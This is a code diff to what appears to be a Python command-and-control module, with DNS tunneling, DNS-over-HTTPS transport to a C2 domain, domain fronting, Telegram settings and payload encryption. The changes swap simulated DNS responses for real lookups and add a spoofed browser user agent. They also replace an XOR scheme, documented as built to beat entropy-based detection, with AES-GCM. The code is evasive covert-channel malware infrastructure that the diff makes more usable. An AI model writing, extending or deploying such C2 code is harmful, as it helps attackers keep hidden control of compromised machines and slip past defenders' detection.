@@ -127,6 +127,7 @@ class C2Config:
     telegram_chat_id: str | None = None
     encryption_key: bytes | None = None
     profile_name: str = "default"
+    user_agent: str = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
 
 
 @dataclass
@@ -671,11 +672,19 @@ class DNSTunneler:
             except Exception as dns_err:
                 # If DNS resolution fails (NXDOMAIN, etc.), it's common in tunneling
                 # but we log it for debugging.
-                logger.exception("DNS Tunneling Error: %s", dns_err)
+                logger.warning("dnspython failed: %s — falling back to socket", dns_err)
 
-                # Fallback Simulation (Original logic)
-                logger.debug("Simulating DNS query: %s", query_name)
-                return True, b"SIMULATED_DNS_RESPONSE"
+                # Real fallback: use low-level socket DNS resolution
+                try:
+                    import socket
+                    addr_info = socket.getaddrinfo(query_name, None, socket.AF_INET)
+                    if addr_info:
+                        ip_addr = addr_info[0][4][0]
+                        return True, ip_addr.encode()
+                    return False, b"NO_RECORDS"
+                except socket.gaierror as sock_err:
+                    logger.debug("Socket DNS also failed for %s: %s", query_name, sock_err)
+                    return False, str(sock_err).encode()
 
         except Exception as e:
             logger.exception("DNS tunnel query failed: %s", e)
@@ -753,7 +762,7 @@ class DoHTransport:
 
         self.provider = provider
         logger.info(
-            "DoH transport initialized: %s via %s", c2_domain, self.endpoint
+            "DoH transport initialized: %s via %s", c2_domain, self.endpoint,
         )
 
     def _build_dns_query(self, name: str, qtype: int = 16) -> bytes:
@@ -783,7 +792,7 @@ class DoHTransport:
 
         # Header
         header = struct.pack(
-            ">HHHHHH", txn_id, flags, qdcount, ancount, nscount, arcount
+            ">HHHHHH", txn_id, flags, qdcount, ancount, nscount, arcount,
         )
 
         # Question section
@@ -841,7 +850,7 @@ class DoHTransport:
 
             if txt_pos + txt_len <= len(txt_data):
                 text = txt_data[txt_pos : txt_pos + txt_len].decode(
-                    "utf-8", errors="ignore"
+                    "utf-8", errors="ignore",
                 )
                 results.append(text)
 
@@ -884,7 +893,7 @@ class DoHTransport:
 
             # Parse TYPE, CLASS, TTL, RDLENGTH
             rtype, _rclass, _ttl, rdlength = struct.unpack(
-                ">HHIH", data[pos : pos + 10]
+                ">HHIH", data[pos : pos + 10],
             )
             pos += 10
 
@@ -1160,9 +1169,7 @@ class C2Channel:
             # DNS client initialization would go here (already implemented logic below)
             self.dns_tunneler = DNSTunneler(
                 self.config.dns_domain,
-                subdomain_length=self.config.subdomain_length_length
-                if hasattr(self.config, "subdomain_length_length")
-                else self.config.dns_subdomain_length,
+                subdomain_length=self.config.dns_subdomain_length,
             )
 
     def connect(self) -> bool:
@@ -1330,7 +1337,7 @@ class C2Channel:
                 method="POST",
             )
 
-            context = self._create_secure_context(
+            context = DomainFronter._create_secure_context(
                 verify=getattr(self.config, "verify_ssl", True),
             )
             context.minimum_version = ssl.TLSVersion.TLSv1_2
@@ -1347,42 +1354,31 @@ class C2Channel:
             return False, b""
 
     def _encrypt(self, data: bytes) -> bytes:
-        """Encrypt data using high-entropy stream (SHA-256 rolling hash).
-        Replaces legacy XOR to pass Shannon Entropy checks (>7.5).
+        """Encrypt data using AES-256-GCM.
+
+        Format: base64(nonce[12] + tag[16] + ciphertext).
+        pycryptodome is a hard dependency — no insecure fallback.
         """
-        key = self.encryption_key
-        result = bytearray()
+        from Crypto.Cipher import AES
 
-        # Initialize state with key
-        state = hashlib.sha256(key).digest()
-
-        for i, byte in enumerate(data):
-            # Regenerate state every 32 bytes to prevent repeating patterns
-            if i % 32 == 0:
-                state = hashlib.sha256(state + key).digest()
-
-            # XOR with state byte
-            result.append(byte ^ state[i % 32])
-
-        return base64.b64encode(bytes(result))
+        key = hashlib.sha256(self.encryption_key).digest()
+        nonce = os.urandom(12)
+        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
+        ciphertext, tag = cipher.encrypt_and_digest(data)
+        return base64.b64encode(cipher.nonce + tag + ciphertext)
 
     def _decrypt(self, data: bytes) -> bytes:
-        """Decrypt high-entropy stream."""
+        """Decrypt AES-256-GCM encrypted data."""
+        from Crypto.Cipher import AES
+
         try:
             decoded = base64.b64decode(data)
-            key = self.encryption_key
-            result = bytearray()
-
-            # Initialize state with key (must match encrypt)
-            state = hashlib.sha256(key).digest()
-
-            for i, byte in enumerate(decoded):
-                if i % 32 == 0:
-                    state = hashlib.sha256(state + key).digest()
-
-                result.append(byte ^ state[i % 32])
-
-            return bytes(result)
+            key = hashlib.sha256(self.encryption_key).digest()
+            nonce = decoded[:12]
+            tag = decoded[12:28]
+            ciphertext = decoded[28:]
+            cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
+            return cipher.decrypt_and_verify(ciphertext, tag)
         except Exception as e:
             logger.exception("Decryption failed: %s", e)
             return b""
